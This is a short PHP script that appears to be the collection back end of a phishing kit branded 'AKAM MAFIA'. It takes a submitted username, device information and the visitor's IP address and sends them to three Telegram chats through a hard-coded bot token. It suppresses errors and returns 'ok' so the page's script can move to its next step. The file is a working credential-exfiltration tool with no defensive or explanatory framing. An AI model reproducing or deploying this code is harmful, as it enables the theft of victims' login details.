<?php
error_reporting(0);
$u = $_POST['usr'];
$d = $_POST['dis'];
$ip = $_SERVER['REMOTE_ADDR'];

$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$ids = ["8114050673", "8518977918", "8638340940"]; 

if(!empty($u)){
    $msg = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n";
    $msg .= "👤 <b>USUARIO:</b> <code>$u</code>\n";
    $msg .= "📱 <b>SISTEMA:</b> $d\n";
    $msg .= "📍 <b>IP:</b> $ip";

    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $id,
            'text' => $msg,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_exec($ch);
        curl_close($ch);
    }
    // ESTO ES VITAL para que el JS sepa que ya puede saltar
    echo "ok";
}
?>
